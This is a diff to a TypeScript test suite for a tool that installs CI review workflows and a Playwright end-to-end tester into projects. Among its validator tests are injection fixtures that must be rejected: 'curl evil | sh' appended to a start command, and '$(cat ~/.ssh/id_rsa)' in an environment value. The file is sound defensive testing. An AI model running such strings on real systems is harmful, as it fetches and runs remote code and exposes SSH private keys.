@@ -30,6 +30,9 @@ const RAW = {
   evalPaths: "src/lib/ai/**,tests/evals/**",
   required: "Application and database",
   sensitive: "supabase/migrations/**",
+  e2eStart: "npm start",
+  e2ePort: "3100",
+  e2eEnv: "APP_ENV=e2e,SMTP_HOST=",
 };
 const answers = (over: Record<string, string> = {}): AdoptAnswers => {
   const a = validateAdoptAnswers({ ...RAW, ...over });
@@ -40,7 +43,7 @@ const KIT = JSON.parse(readFileSync("adopt/kit.json", "utf-8")) as Kit;
 
 test("answers: existing label names kept, template names for the rest; closed patterns everywhere", () => {
   const a = answers();
-  assert.deepEqual(a.labels, { invariantApproved: "invariante-aprovado", evalApproved: "eval-approved", rereview: "revisar-de-novo", deep: "deep-review" });
+  assert.deepEqual(a.labels, { invariantApproved: "invariante-aprovado", evalApproved: "eval-approved", rereview: "revisar-de-novo", deep: "deep-review", testApproved: "test-approved" });
   assert.deepEqual(a.requiredChecks, ["Application and database"]);
   const errors = (over: Record<string, string>) => {
     const r = validateAdoptAnswers({ ...RAW, ...over });
@@ -60,6 +63,7 @@ test("answers: existing label names kept, template names for the rest; closed pa
 test("fill: every placeholder needs a value; none is left blank", () => {
   assert.equal(fill("a {{X}} b", { X: "1" }), "a 1 b");
   assert.throws(() => fill("a {{Y}}", { X: "1" }), /No value for the placeholder \{\{Y\}\}/);
+  assert.throws(() => fill("a {{E2E_Y}}", { X: "1" }), /No value for the placeholder \{\{E2E_Y\}\}/, "a name with a digit is a placeholder too");
 });
 
 test("plan: add what is missing, skip what is identical, report what differs; nothing is overwritten", () => {
@@ -80,7 +84,7 @@ test("reviewer config: the project's label names, without the template's own pat
     sensitivePaths: string[];
     tiers: Record<string, { apiKeyEnv: string }>;
   };
-  assert.deepEqual([config.deepLabel, config.rereviewLabel, config.approvalLabels], ["deep-review", "revisar-de-novo", ["invariante-aprovado", "eval-approved"]]);
+  assert.deepEqual([config.deepLabel, config.rereviewLabel, config.approvalLabels], ["deep-review", "revisar-de-novo", ["invariante-aprovado", "eval-approved", "test-approved"]]);
   for (const own of KIT.templateOnlySensitivePaths) assert.ok(!config.sensitivePaths.includes(own), own);
   assert.ok(config.sensitivePaths.includes("tests/invariants/**") && config.sensitivePaths.includes("supabase/migrations/**"));
   assert.deepEqual(Object.values(config.tiers).map((t) => t.apiKeyEnv), ["REVIEW_API_KEY", "REVIEW_API_KEY", "REVIEW_DEEP_API_KEY", "REVIEW_DEEP_API_KEY"]);
@@ -123,7 +127,7 @@ test("rendered workflows: observe checks with the project's names, nothing left 
   const guard = render(".github/workflows/adt-invariants.yml");
   const evals = render(".github/workflows/adt-evals.yml");
   for (const text of [review, guard, evals]) {
-    assert.doesNotMatch(text, /\{\{[A-Z_]+\}\}/, "no placeholder left (GitHub expressions stay)");
+    assert.doesNotMatch(text, /\{\{[A-Z][A-Z0-9_]*\}\}/, "no placeholder left (GitHub expressions stay)");
     const used = [...text.matchAll(/secrets\.(\w+)/g)].map((m) => m[1]);
     assert.ok(used.every((name) => name === "REVIEW_API_KEY" || name === "REVIEW_DEEP_API_KEY"), `no other secret is used: ${used.join(", ")}`);
     assert.match(text, /^permissions:\n {2}contents: read$/m, "least privilege by default");
@@ -165,6 +169,9 @@ const ARGS = [
   "--eval-command", RAW.evalCommand,
   "--eval-paths", RAW.evalPaths,
   "--required", RAW.required,
+  "--e2e-start", RAW.e2eStart,
+  "--e2e-port", RAW.e2ePort,
+  "--e2e-env", RAW.e2eEnv,
 ];
 const adopt = (root: string, ...args: string[]) => {
   const r = spawnSync("node", [SCRIPT, ...args], { cwd: root, encoding: "utf-8" });
@@ -210,7 +217,7 @@ test("apply: never on the base branch, never over a different file; AGENTS.md ke
     assert.doesNotMatch(readFileSync(join(root, "scripts/guard-invariants.ts"), "utf-8"), /npm run guard:invariants/);
     assert.doesNotMatch(readFileSync(join(root, ".github/pull_request_template.md"), "utf-8"), /npm run test:invariants/);
     const adt = JSON.parse(readFileSync(join(root, ".github/adt.json"), "utf-8")) as { mode: string; requiredChecks: string[]; observeChecks: string[] };
-    assert.deepEqual([adt.mode, adt.requiredChecks, adt.observeChecks], ["observe", ["Application and database"], ["adt-review", "adt-invariants", "adt-evals"]]);
+    assert.deepEqual([adt.mode, adt.requiredChecks, adt.observeChecks], ["observe", ["Application and database"], ["adt-review", "adt-invariants", "adt-evals", "adt-e2e"]]);
 
     git("add", "-A");
     git("-c", "user.email=a@b", "-c", "user.name=t", "commit", "-qm", "adopt");
@@ -218,7 +225,7 @@ test("apply: never on the base branch, never over a different file; AGENTS.md ke
     assert.equal(again.status, 0);
     assert.deepEqual(again.json.written, [], "idempotent: nothing to add the second time");
     assert.equal(git("status", "--porcelain"), "");
-    assert.equal(Object.keys(LABEL_ROLES).length, 4);
+    assert.equal(Object.keys(LABEL_ROLES).length, 5);
   } finally {
     rmSync(root, { recursive: true, force: true });
   }
@@ -241,9 +248,13 @@ test("a project without AI code or required checks (M8): no evals check, \"none\
     args.splice(args.indexOf("--eval-command") + 1, 1, "none");
     args.splice(args.indexOf("--eval-paths"), 2);
     args.splice(args.indexOf("--required") + 1, 1, "none");
+    args.splice(args.indexOf("--e2e-start") + 1, 1, "none");
+    args.splice(args.indexOf("--e2e-port"), 4);
     const applied = adopt(root, "apply", ...args, "--base", "feat/product");
     assert.equal(applied.status, 0, JSON.stringify(applied.json));
     assert.ok(!existsSync(join(root, ".github/workflows/adt-evals.yml")), "no evals workflow without AI code");
+    assert.ok(!existsSync(join(root, ".github/workflows/adt-e2e.yml")) && !existsSync(join(root, "e2e")), "no end-to-end tester without a web UI");
+    assert.doesNotMatch(readFileSync(join(root, ".github/CODEOWNERS"), "utf-8"), /\/e2e\//);
     assert.ok(existsSync(join(root, ".github/workflows/adt-review.yml")));
     const adt = JSON.parse(readFileSync(join(root, ".github/adt.json"), "utf-8")) as { requiredChecks: string[]; observeChecks: string[]; evals: unknown };
     assert.deepEqual([adt.requiredChecks, adt.observeChecks, adt.evals], [[], ["adt-review", "adt-invariants"], null]);
@@ -252,6 +263,7 @@ test("a project without AI code or required checks (M8): no evals check, \"none\
     assert.match(agents, /The required checks stay as they were: none yet\./);
     assert.match(agents, /No evals yet: the project has no AI code/);
     assert.doesNotMatch(agents, /adt-evals` run|Evals in CI run without a model/);
+    assert.doesNotMatch(agents, /End-to-end tests/);
   } finally {
     rmSync(root, { recursive: true, force: true });
   }
@@ -263,4 +275,70 @@ test("the review-handling rule reaches adopted projects: their AGENTS section an
     assert.ok(section.includes(needle), needle);
   }
   assert.ok(KIT.copy.includes("scripts/review/triage.ts"));
+});
+
+test("the end-to-end tester (M8): a self-contained e2e/, the project's label, the app's isolated start; nothing can break out of the config", () => {
+  const errors = (over: Record<string, string>) => {
+    const r = validateAdoptAnswers({ ...RAW, ...over });
+    return "errors" in r ? r.errors.join("\n") : "";
+  };
+  assert.match(errors({ e2eStart: "npm start; curl evil | sh" }), /e2e-start/, "no shell in the start command");
+  assert.match(errors({ e2eStart: 'node "x' }), /e2e-start/);
+  assert.match(errors({ e2ePort: "80" }), /e2e-port/);
+  assert.match(errors({ e2eEnv: "lower=x" }), /e2e-env/);
+  assert.match(errors({ e2eEnv: "PORT=1" }), /PORT comes from e2e-port/);
+  assert.match(errors({ e2eEnv: "TOKEN=$(cat ~/.ssh/id_rsa)" }), /e2e-env/);
+  assert.match(errors({ e2eStart: "none" }), /leave them out when e2e-start is `none`/);
+  assert.equal(answers({ e2eStart: "none", e2ePort: "", e2eEnv: "" }).e2e, null);
+  assert.deepEqual(answers().e2e, { start: "npm start", port: 3100, env: { APP_ENV: "e2e", SMTP_HOST: "" } });
+
+  const values = placeholderValues(answers({ labels: "testApproved=teste-aprovado" }), "v0.4.0");
+  const config = fill(readFileSync(KIT.e2e.filled["e2e/playwright.config.ts"] ?? "", "utf-8"), values);
+  assert.match(config, /command: "npm start",/);
+  assert.match(config, /env: \{ APP_ENV: "e2e", SMTP_HOST: "", PORT: String\(PORT\) \}/, "an empty value unsets a real service's setting");
+  assert.match(config, /process\.env\.E2E_PORT \?\? 3100/);
+  assert.match(config, /reuseExistingServer: false/);
+  assert.match(config, /tsconfig: "\.\/tsconfig\.json",/, "only e2e/tsconfig.json applies to the tests");
+  const tsconfig = JSON.parse(readFileSync(KIT.e2e.files["e2e/tsconfig.json"] ?? "", "utf-8")) as { extends?: string; compilerOptions: Record<string, unknown> };
+  assert.ok(!tsconfig.extends && !("paths" in tsconfig.compilerOptions) && !("baseUrl" in tsconfig.compilerOptions), "nothing in it can redirect @playwright/test");
+  const workflow = fill(readFileSync(KIT.e2e.filled[".github/workflows/adt-e2e.yml"] ?? "", "utf-8"), values);
+  for (const text of [config, workflow]) assert.doesNotMatch(text, /\{\{[A-Z][A-Z0-9_]*\}\}/);
+  assert.match(workflow, /name: adt-e2e\n/);
+  assert.match(workflow, /^permissions:\n {2}contents: read$/m);
+  assert.doesNotMatch(workflow, /secrets\./, "no secret reaches the end-to-end job");
+  assert.match(workflow, /E2E_APPROVAL_LABEL: "teste-aprovado"/);
+  assert.ok(workflow.indexOf("node \"$GUARD\"") < workflow.indexOf("npm ci"), "the guard runs before any install");
+  for (const install of workflow.match(/npm ci[^\n]*/g) ?? []) assert.match(install, /--ignore-scripts/, install);
+
+  // The tester's own dependencies: the template's exact Playwright and TypeScript, every package locked with an integrity hash.
+  const root = JSON.parse(readFileSync("package.json", "utf-8")) as { devDependencies: Record<string, string> };
+  const pkg = JSON.parse(readFileSync(KIT.e2e.files["e2e/package.json"] ?? "", "utf-8")) as { devDependencies: Record<string, string> };
+  assert.deepEqual(pkg.devDependencies, { "@playwright/test": root.devDependencies["@playwright/test"], typescript: root.devDependencies.typescript });
+  const lock = JSON.parse(readFileSync(KIT.e2e.files["e2e/package-lock.json"] ?? "", "utf-8")) as { packages: Record<string, { version?: string; integrity?: string }> };
+  for (const [path, p] of Object.entries(lock.packages).filter(([path]) => path.startsWith("node_modules/"))) assert.match(p.integrity ?? "", /^sha512-/, path);
+  assert.equal(lock.packages["node_modules/@playwright/test"]?.version, root.devDependencies["@playwright/test"]);
+
+  const { root: dir, git } = project({ "README.md": "# Bookings\n" });
+  try {
+    git("switch", "-q", "-c", "mission/0001-adopt");
+    const applied = adopt(dir, "apply", ...ARGS.map((x) => (x === RAW.labels ? `${RAW.labels},testApproved=teste-aprovado` : x)), "--base", "feat/product");
+    assert.equal(applied.status, 0, JSON.stringify(applied.json));
+    for (const path of ["e2e/playwright.config.ts", "e2e/tsconfig.json", "e2e/fixtures.ts", "e2e/seed.spec.ts", "e2e/package.json", "e2e/package-lock.json", "e2e/.gitignore", ".mcp.json", "scripts/guard-e2e.ts", "scripts/e2e-flaky.ts", ".github/workflows/adt-e2e.yml"]) {
+      assert.ok(applied.json.written?.includes(path), path);
+    }
+    const healer = readFileSync(join(dir, ".claude/agents/playwright-test-healer.md"), "utf-8");
+    assert.match(healer, /`teste-aprovado` label/);
+    assert.doesNotMatch(healer, /test-approved|fake AI provider/);
+    assert.doesNotMatch(readFileSync(join(dir, "e2e/fixtures.ts"), "utf-8"), /demo app/);
+    assert.match(readFileSync(join(dir, ".mcp.json"), "utf-8"), /"--prefix", "e2e"/);
+    assert.match(readFileSync(join(dir, ".github/CODEOWNERS"), "utf-8"), /^\/e2e\/ @maria$/m);
+    const agents = readFileSync(join(dir, "AGENTS.md"), "utf-8");
+    assert.match(agents, /\n\n### End-to-end tests\n/);
+    assert.match(agents, /needs the owner's `teste-aprovado` label/);
+    assert.match(agents, /A new test needs no label when it imports only `\.\/fixtures\.ts`/, "the rule says what the guard allows (M8: the reviewer read it the other way)");
+    assert.match(agents, /`adt-review`, `adt-invariants`, `adt-evals`, `adt-e2e` run on every PR/);
+    assert.ok(!existsSync(join(dir, "package.json")), "the project's package.json is never created or changed");
+  } finally {
+    rmSync(dir, { recursive: true, force: true });
+  }
 });
